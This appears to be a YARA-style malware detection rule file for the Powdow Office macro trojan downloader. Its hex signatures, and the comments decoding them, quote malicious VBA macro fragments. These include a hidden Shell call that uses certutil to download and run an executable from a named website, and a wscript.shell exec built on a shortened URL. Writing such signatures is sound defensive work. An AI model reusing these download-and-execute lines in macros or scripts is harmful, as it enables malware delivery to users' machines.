
rule TrojanDownloader_O97M_Powdow_PDG_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PDG!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 64 6f 78 69 74 69 6e 67 2e 63 6f 2e 7a 61 2f 77 70 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 75 70 6c 6f 61 64 73 2f 46 55 4c 4c 46 4f 52 43 45 2e 65 78 65 22 22 20 } //01 00  = Shell("cmd /c certutil.exe -urlcache -split -f ""http://doxiting.co.za/wp/wp-content/uploads/FULLFORCE.exe"" 
		$a_01_1 = {26 26 20 50 71 64 61 68 69 73 6b 6f 74 68 6c 76 70 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //00 00  && Pqdahiskothlvp.exe.exe", vbHide)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_PDG_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PDG!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 76 62 61 2e 72 65 70 6c 61 63 65 28 22 6d 73 68 6b 69 22 2c 22 6b 69 22 2c 22 74 61 22 29 } //01 00  =vba.replace("mshki","ki","ta")
		$a_01_1 = {3d 22 68 74 74 70 3a 2f 2f 6a 2e 6d 70 2f 22 63 68 75 3d 66 65 65 2b 6b 6b 69 2b 61 6b 73 64 65 6e 64 66 75 6e 63 74 69 6f 6e 70 75 62 6c 69 63 66 75 6e 63 74 69 6f 6e 6c 6e 6b 28 29 } //01 00  ="http://j.mp/"chu=fee+kki+aksdendfunctionpublicfunctionlnk()
		$a_01_2 = {70 75 62 6c 69 63 66 75 6e 63 74 69 6f 6e 74 61 28 29 76 62 61 2e 62 65 65 70 76 62 61 2e 62 65 65 70 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 2e 65 78 65 63 63 68 75 2b 6c 6e 6b 65 6e 64 66 75 6e 63 74 69 6f 6e } //01 00  publicfunctionta()vba.beepvba.beepcreateobject("wscript.shell").execchu+lnkendfunction
		$a_01_3 = {64 65 62 75 67 2e 70 72 69 6e 74 6d 73 67 62 6f 78 28 22 72 65 2d 69 6e 73 74 61 6c 6c 6f 66 66 69 63 65 22 2c 76 62 6f 6b 63 61 6e 63 65 6c 29 3b 72 65 74 75 72 6e 73 3b 31 64 65 62 75 67 2e 70 72 69 6e 74 6d 65 67 67 67 67 67 61 2e 74 61 65 6e 64 73 75 62 } //00 00  debug.printmsgbox("re-installoffice",vbokcancel);returns;1debug.printmeggggga.taendsub
	condition:
		any of ($a_*)
 
}